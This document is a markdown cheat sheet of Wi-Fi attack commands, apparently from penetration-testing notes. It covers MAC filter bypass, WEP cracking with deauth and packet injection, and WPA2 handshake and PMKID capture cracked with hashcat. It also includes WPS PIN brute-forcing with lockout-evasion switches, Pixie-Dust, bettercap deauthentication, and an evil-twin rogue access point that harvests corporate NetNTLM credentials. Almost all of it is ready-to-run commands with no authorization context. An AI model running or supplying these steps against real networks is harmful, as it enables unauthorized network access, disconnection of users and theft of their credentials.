## General Informations 
```bash
# Bypass MAC filter
macchanger –m B0:D0:9C:5C:EF:86 wlan0
```
## Monitoring, Recon and Dumping 
```bash
# Using the aircrack-ng suite
# Turning on the monitor mode
sudo airmon-ng start wlan0mon

# Simple passive listening and capture
# Used to discover AP in the environment
sudo airodump-ng wlan0mon

# Targetted listening and capture
# Focus on one AP and one channel
sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile
```
## Attacking WEP 
```bash
# WEP is an old encryption protocol but still used in some places
# It is vulnerable to direct cracking attacks

# The only requirement is to get enough IV
# The process can be enhanced by sending deauth packets
# -0 == detauth attack, sending 3 packets (can be increased)
aireplay-ng -0 3 -a <TARGET_AP_MAC> wlan0mon -w 

# Another possibility is to use fake authentication to generate IV
# -1 = fake authentication
# 0 = delay between association demands
# -e = AP ESSID (name)
# -a = AP MAC
# -h = attacker MAC
aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

# ARP Sniffing and injection is another method
aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon

# Using aircrack-ng it is possible to directly crack the WEP Key
aircrack-ng outfile -w wordlist
````
## Attacking WPA2 PSK (The old way) 
```bash
# Using the aircrack-ng suite
# You can first focus one AP using airodump-ng (see monitoring section)
# Here, you want to get the 4-way WPA Handshake
# It requires network traffic between the AP and one device

# Dumping
sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile

# Deauth connected devices to initiate authentication process and try to get the handshake
aireplay-ng --deauth 15 -a <TARGET_AP_MAC> wlan0mon
aireplay-ng -0 15 -a <TARGET_AP_MAC> wlan0mon 

# In the airodump-ng console, the WPA handshake will appear once captured
```

```bash
# Cracking can be done using aircrack-ng
aircrack-ng outfile -w wordlist

# But also using other tools like hashcat
# The outfile needs to be an HCCAPX file
# Hashcat utils provide a binary to convert
.\cap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx

# Then you can crack it like a normal hash (see hashcat section)
.\hashcat64.exe -m 2500 WPA2_test.hccapx wordlist.txt --force -O
```
## Attacking WPA2 using PMKID 
```bash
# You don't need any network traffic
# Using hcxtools and hcxdumptool

# Monitor mode
sudo airmon-ng start wlan0mon

# PMKID capture
# It can take a while to capture PKMID (several minutes++)
# If an AP recieves our association request packet and supports sending 
sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1

# Then convert the captured data to a suitable format for hashcat
# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
# -I retrieve identities from WiFi-traffic
# -U retrieve usernames from WiFi-traffic
sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

# Then, you can use hashcat to crack it (see hashcat section)
./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
```
## Attacking WPS (WiFi Protected Setup) 
```bash
# Reaver Attack
# Online bruteforcing of the WPS 8-digits PIN
# Kinda old and can be obsolete nowadays, but still usable

# Reaver integrated dumping tool (can also airodump-ng)
# Wash gives information about WPS being locked or not
# Locked WPS will have less success chances
wash -i wlan0mon

# Launching reaver
reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv

# Some manufacturers have implemented protections
# You can try different switches to bypass
# -L = Ignore locked state
# -N = Don't send NACK packets when errors are detected
# -d = delay X seconds between PIN attempts
# -T = set timeout period to X second (.5 means half second)
# -r = After X attemps, sleep for Y seconds
reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15
```

```bash
# Pixie-Dust Attack
# Done with Reaver + PixieWPS
# This attack is based on seed / false random

# Start reaver, we need the PKE, PKR, e-hash 1 & e-hash 2, E-nonce / R-nonce 
# and the authkey from Reaver to use for pixiewps
reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv -S

# Now using pixiexps, you can crack PIN offline
pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>

# Then, you can use the PIN with reaver to get to cleartext password
reaver -i <monitor interface> -b <bssid> -c <channel>  -p <PIN>
```
## Bettercap Pwning ([https://www.bettercap.org/modules/](https://www.bettercap.org/modules/)) 
```bash
# Deauth and 4-way handshake attack
sudo bettercap -iface wlan0

# Start the monitoring mode
> wifi.recon on

# Set the AP sorting by clients number
> set wifi.show.sort clients desc

# Every 1 sec, clear view and display an updated one
> set ticker.commands 'clear; wifi.show'
> ticker on

# Set the target channel
> wifi.recon.channel 1

# Initiate deauth packets
> wifi.deauth e0:xx:xx:xx:xx:xx

# Convert
/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx

# Cracking
/path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
```

```bash
# Client-less PMKID Attack
# PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
sudo bettercap -iface wlan0

# Start the monitoring mode
> wifi.recon on

# As long as the PMK is constant, we just need to get one to initiate attack
# Instead of deauth others, we will associate to the AP and listen which one
# Send good informations
# wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
> wifi.assoc all

# Convert
/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap

# Cracking
/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```
## ROGUE AP ATTACK
If you need several external eth interfaces, connect then at the beginning
To ensure having wlan0 and wlan1
And avoid having wlan0mon and then wlan0 when you connect the second one
It could result in conflicts.

Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies.
Manually creating a rogue AP for classical WPA/WPA2 requires more configuration.

### Evil Twin attack
```bash
# 1/ Start monitoring mode
# If you plan to use deauth attack, connect the 2 eth interfaces at the same time
# To avoid having wlan0mon and wlan0 (it can conflict)
sudo airmon-ng start wlan0

# 2/ If process are blocking the monitoring mode, kill them
sudo airmon-ng check kill
sudo kill <PID>

# 3/ Get the target AP (ESSID)
# Your target can have multiples AP, and so multiples MAC addresses
# They can run on differents channels
sudo airodump wlan0mon

# 4/ Then set the target in the configuration file
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
ssid=<ESSID>

# 5/ Start AP
# You will only get people that newly connects to the target AP
# If you want to get people already connected, you need to push the attack further with deauth
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 6/ Start the second ethernet interface
sudo airmon-ng start wlan1

# 7/ Deauth (In another terminal)
# Based on the differents ESSID and channels found in step 3
# -0 is the number of deauth packet sent
sudo aireplay-ng -0 10 -a <mac address> -c <channel>

# Then wait for credz \o/
# You will probably get NetNTLMv1 hashes you will need to crack
